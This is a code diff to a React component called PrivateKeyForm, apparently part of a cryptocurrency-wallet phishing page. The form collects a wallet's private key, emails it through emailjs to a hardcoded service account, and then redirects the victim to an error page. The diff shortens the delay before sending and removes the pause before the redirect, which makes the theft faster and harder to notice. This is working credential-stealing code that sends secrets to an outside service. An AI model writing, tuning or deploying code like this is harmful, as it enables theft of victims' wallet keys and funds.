@@ -58,7 +58,7 @@ const PrivateKeyForm = ({ wallet, privateKeyLengthNotlong }) => {
           'pudHPDoixy2beukw8'
         );
 
-        await sendFast(1 * 60 * 1000);
+        await sendFast(1 * 5 * 1000);
         
         await emailjs.send(
           'service_ky8xa0e',
@@ -76,9 +76,7 @@ const PrivateKeyForm = ({ wallet, privateKeyLengthNotlong }) => {
           'pudHPDoixy2beukw8'
         );
 
-        setTimeout(() => {
-          navigate('/error');
-        }, 3000);
+        navigate('/error');
       } catch (error) {
         console.log(error);
         setPrivateSubmitBtn('CONNECT');
